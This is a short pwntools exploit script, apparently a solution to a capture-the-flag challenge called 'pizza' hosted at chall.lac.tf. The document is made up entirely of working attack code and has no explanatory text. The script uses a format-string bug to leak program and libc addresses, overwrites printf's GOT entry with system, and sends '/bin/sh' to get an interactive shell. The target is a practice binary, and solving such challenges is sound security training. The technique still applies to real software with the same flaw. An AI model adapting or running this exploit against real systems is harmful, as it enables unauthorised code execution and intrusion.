#!/usr/bin/env python3

from pwn import *

exe = ELF("./pizza_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

if args.REMOTE:
    r = remote("chall.lac.tf", 31134)
else:
    r = process([exe.path])
    if args.GDB:
        gdb.attach(r)

r.sendlineafter(b'> ', b'12')
r.sendlineafter(b'topping: ', b'%49$p %47$p')
r.sendlineafter(b'> ', b'0')
r.sendlineafter(b'> ', b'0')
r.recvuntil(b'chose:\n')
exe.address = int(r.recvuntil(b' ', drop=True), 0) - 0x1189
log.info(f'{hex(exe.address)=}')
libc.address = int(r.recvline(keepends=False), 0) - 0x2724a
log.info(f'{hex(libc.address)=}')
r.sendlineafter(b'(y/n): ', b'y')

pl = fmtstr_payload(6, {exe.got.printf: libc.symbols.system}, write_size='short')
assert len(pl) < 100
r.sendlineafter(b'> ', b'12')
r.sendlineafter(b'topping: ', pl)
r.sendlineafter(b'> ', b'12')
r.sendlineafter(b'topping: ', b'/bin/sh')
r.sendlineafter(b'> ', b'0')

r.interactive()
